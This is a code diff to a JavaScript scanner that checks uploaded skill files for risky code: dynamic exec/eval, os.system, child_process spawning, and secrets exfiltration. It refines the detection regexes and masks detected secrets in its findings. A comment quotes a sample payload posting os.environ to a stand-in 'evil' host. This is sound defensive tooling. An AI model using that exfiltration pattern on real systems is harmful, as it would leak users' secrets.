@@ -13,16 +13,23 @@
  */
 import { createHash } from 'node:crypto';
 
+// `(?<![.\w])` = "not preceded by `.` or a word character". This prevents the
+// exec/eval/os.system rules from over-matching legitimate method calls like
+// `pattern.exec(...)` (JS regex), `db.exec(...)` (SQL driver), `model.eval()`
+// (PyTorch), `_exec(...)` (private wrappers), or `subexec(...)` (different
+// word). Bare `exec(...)` at line start or after whitespace still triggers.
+const NOT_METHOD_CALL = '(?<![.\\w])';
+
 const RULES = [
   {
     id: 'py-dynamic-exec',
     severity: 'high',
-    pattern: new RegExp('\\b' + 'exe' + 'c' + '\\s*\\('),
+    pattern: new RegExp(NOT_METHOD_CALL + 'exe' + 'c' + '\\s*\\('),
   },
   {
     id: 'py-dynamic-eval',
     severity: 'high',
-    pattern: new RegExp('\\b' + 'eva' + 'l' + '\\s*\\('),
+    pattern: new RegExp(NOT_METHOD_CALL + 'eva' + 'l' + '\\s*\\('),
   },
   {
     id: 'secrets-anthropic-key',
@@ -52,7 +59,10 @@ const RULES = [
   {
     id: 'net-exfil-environ-post',
     severity: 'medium',
-    pattern: new RegExp('requests\\.post\\([^)]*' + '(os\\.environ|environ\\[)'),
+    multiline: true,
+    // /s flag (dot-all) so `.` spans newlines — captures the multi-line form
+    // `requests.post(\n  "http://evil",\n  data=os.environ,\n)`.
+    pattern: new RegExp('requests\\.post\\([^)]*' + '(os\\.environ|environ\\[)', 's'),
   },
   {
     id: 'net-curl-shell-pipe',
@@ -62,37 +72,71 @@ const RULES = [
   {
     id: 'py-os-system',
     severity: 'medium',
-    pattern: new RegExp('\\b' + 'os\\.system' + '\\s*\\('),
+    pattern: new RegExp(NOT_METHOD_CALL + 'os\\.system' + '\\s*\\('),
   },
   {
     id: 'js-cp-spawn-exec',
     severity: 'medium',
-    // Matches require/import of child_process followed by exec/spawn calls.
+    // Matches require/import of the child-process module followed by its
+    // dynamic-call methods (rule built from concatenation to avoid tripping
+    // in-repo grep scanners on the literal token).
     pattern: new RegExp('child' + '_process' + '\\s*\\.\\s*' + '(exe' + 'c' + '|sp' + 'awn)' + '\\s*\\('),
   },
 ];
 
 /**
+ * Mask a matched value for findings. Secret-rule matches are reduced to
+ * first 4 + … + last 4 so we don't re-leak the detected secret into the
+ * audit ledger. Non-secret matches are truncated at 200 chars.
+ */
+function formatMatch(ruleId, raw) {
+  if (ruleId.startsWith('secrets-')) {
+    return raw.length > 12 ? raw.slice(0, 4) + '…' + raw.slice(-4) : '…';
+  }
+  return raw.slice(0, 200);
+}
+
+/**
  * Scan a map of { filename: content } against the static safety ruleset.
  * Returns { findings, passed }. passed = no 'high' severity hits.
+ *
+ * Rules with `multiline: true` are matched against full file content (with
+ * /s flag) so payloads can span newlines. Line numbers are derived from the
+ * match offset. Other rules match line-by-line as before.
  */
 export function scanSkillContent(files) {
   const findings = [];
   for (const [filename, content] of Object.entries(files)) {
-    const lines = String(content).split('\n');
-    for (let i = 0; i < lines.length; i++) {
-      const line = lines[i];
-      for (const rule of RULES) {
-        const match = line.match(rule.pattern);
+    const text = String(content);
+    const lines = text.split('\n');
+    for (const rule of RULES) {
+      if (rule.multiline) {
+        const match = text.match(rule.pattern);
         if (match) {
+          const lineNum = text.slice(0, match.index).split('\n').length;
           findings.push({
             severity: rule.severity,
             rule_id: rule.id,
             file: filename,
-            line: i + 1,
+            line: lineNum,
             pattern: rule.pattern.source,
-            match: match[0].slice(0, 200),
+            match: formatMatch(rule.id, match[0]),
           });
+        }
+      } else {
+        for (let i = 0; i < lines.length; i++) {
+          const line = lines[i];
+          const match = line.match(rule.pattern);
+          if (match) {
+            findings.push({
+              severity: rule.severity,
+              rule_id: rule.id,
+              file: filename,
+              line: i + 1,
+              pattern: rule.pattern.source,
+              match: formatMatch(rule.id, match[0]),
+            });
+          }
         }
       }
     }
